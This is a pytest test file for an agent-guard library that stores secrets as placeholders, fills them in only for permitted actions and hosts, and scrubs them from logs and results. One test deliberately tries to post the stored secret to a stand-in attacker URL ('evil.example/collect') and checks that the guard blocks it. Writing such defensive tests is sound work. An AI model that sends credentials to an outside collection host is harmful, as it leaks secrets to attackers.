"""Placeholder credentials (R20): the agent names a secret; the guard fills it
in after the decision, only where allowed, and scrubs it from results."""
import json

import pytest

from interlock import Blocked, Decision, guard, install, monitor
from interlock.credentials import (
    SecretStore,
    install_store,
    placeholder,
    scrub,
    used_ids,
)
from interlock.interceptors.mcp import enforce_tool_call, enforce_tool_result
from interlock.receipt import set_sink
from interlock.sink import InMemorySink

VALUE = "placeholder-secret-value-0001"


@pytest.fixture
def store():
    s = SecretStore().add("stripe", value=VALUE, actions=["http_post"],
                          hosts=["api.stripe.com"], label="Stripe test key", tags=["payments"])
    install_store(s)
    yield s
    install_store(None)


@pytest.fixture
def sink():
    s = InMemorySink()
    set_sink(s)
    yield s
    set_sink(None)


def make_post(seen):
    @guard()
    def http_post(url, headers=None, body=""):
        seen.append({"url": url, "headers": headers, "body": body})
        return "ok"
    return http_post


def test_the_tool_gets_the_value_and_policy_sees_the_placeholder(store, sink):
    seen_by_policy = []
    install(rules=[lambda e: seen_by_policy.append(dict(e.args)) or None])
    seen = []
    make_post(seen)("https://api.stripe.com/v1/charges",
                    headers={"Authorization": "Bearer " + placeholder("stripe")})
    assert seen[0]["headers"]["Authorization"] == "Bearer " + VALUE
    assert "{{secret:stripe}}" in json.dumps(seen_by_policy)
    assert VALUE not in json.dumps(seen_by_policy)
    log = "\n".join(r.to_json() for r in sink.receipts)
    assert VALUE not in log
    assert any(r.policy_id == "credentials" and "stripe" in r.reason for r in sink.receipts)


def test_positional_arguments_are_filled(store):
    seen = []
    make_post(seen)("https://api.stripe.com/x", None, "key=" + placeholder("stripe"))
    assert seen[0]["body"] == "key=" + VALUE


def test_wrong_action_is_blocked_before_the_tool_runs(store):
    @guard()
    def send_email(to, body):
        raise AssertionError("must not run")

    with pytest.raises(Blocked, match="not allowed for action 'send_email'"):
        send_email("x@y.z", placeholder("stripe"))


def test_wrong_host_is_blocked(store):
    seen = []
    with pytest.raises(Blocked, match="may not be sent to 'evil.example'"):
        make_post(seen)("https://evil.example/collect", body=placeholder("stripe"))
    assert seen == []


def test_unknown_secret_is_blocked(store):
    with pytest.raises(Blocked, match="unknown secret 'nope'"):
        make_post([])("https://api.stripe.com/", body=placeholder("nope"))


def test_echoed_secret_is_scrubbed_from_the_result(store):
    @guard()
    def http_post(url, body=""):
        return {"echo": "you sent " + VALUE}

    out = http_post("https://api.stripe.com/x", body=placeholder("stripe"))
    assert out == {"echo": "you sent {{secret:stripe}}"}


def test_result_rules_never_see_the_value(store):
    seen = []

    def result_rule(event):
        seen.append(json.dumps(event.args))
        return None
    result_rule.phase = "result"
    install(rules=[result_rule])
    enforce_tool_call("http_post", {"url": "https://api.stripe.com", "body": placeholder("stripe")})
    enforce_tool_result("http_post", "token=" + VALUE)
    assert seen and VALUE not in seen[0]


def test_mcp_path(store):
    args = enforce_tool_call("http_post", {"url": "https://api.stripe.com", "key": placeholder("stripe")})
    assert args["key"] == VALUE


def test_monitor_mode_never_fills_a_refused_placeholder(store, sink):
    @monitor()
    def send_email(to, body):
        return body

    assert send_email("x@y.z", placeholder("stripe")) == placeholder("stripe")
    refusal = [r for r in sink.receipts if r.policy_id == "credentials"]
    assert refusal and refusal[0].observed and refusal[0].verdict == "BLOCK"


def test_a_block_from_policy_happens_before_any_value_is_read(store):
    reads = []
    store.add("lazy", getter=lambda: reads.append(1) or "v", actions=["http_post"])
    install(rules=[lambda e: Decision.block("no")])
    with pytest.raises(Blocked):
        make_post([])("https://x", body=placeholder("lazy"))
    assert reads == []


def test_sources(tmp_path, monkeypatch):
    monkeypatch.setenv("MY_TOKEN", "from-env")
    token_file = tmp_path / "token"
    token_file.write_text("from-file\n")
    s = (SecretStore()
         .add("e", env="MY_TOKEN", actions=["a"])
         .add("f", file=str(token_file), actions=["a"])
         .add("g", getter=lambda: "from-getter", actions=["a"]))
    install_store(s)
    try:
        args = enforce_tool_call("a", {"x": placeholder("e"), "y": placeholder("f"),
                                       "z": [placeholder("g")]})
    finally:
        install_store(None)
    assert args == {"x": "from-env", "y": "from-file", "z": ["from-getter"]}


def test_missing_env_value_blocks(monkeypatch):
    monkeypatch.delenv("ABSENT_TOKEN", raising=False)
    install_store(SecretStore().add("x", env="ABSENT_TOKEN", actions=["a"]))
    try:
        with pytest.raises(Blocked, match="could not be read"):
            enforce_tool_call("a", {"k": placeholder("x")})
    finally:
        install_store(None)


def test_catalog_never_has_values(store):
    catalog = store.catalog()
    assert catalog == [{"id": "stripe", "label": "Stripe test key", "tags": ["payments"],
                        "actions": ["http_post"], "hosts": ["api.stripe.com"]}]
    assert VALUE not in json.dumps(catalog)


def test_registration_errors():
    with pytest.raises(ValueError):
        SecretStore().add("x", actions=["a"])
    with pytest.raises(ValueError):
        SecretStore().add("x", value="v", env="E", actions=["a"])
    with pytest.raises(ValueError):
        SecretStore().add("x", value="v", actions=[])
    with pytest.raises(ValueError):
        SecretStore().add("bad id", value="v", actions=["a"])


def test_helpers_without_a_store():
    install_store(None)
    assert scrub("abc") == "abc"
    assert used_ids({"a": ["{{ secret:x }}", "{{secret:y}}"]}) == ["x", "y"]
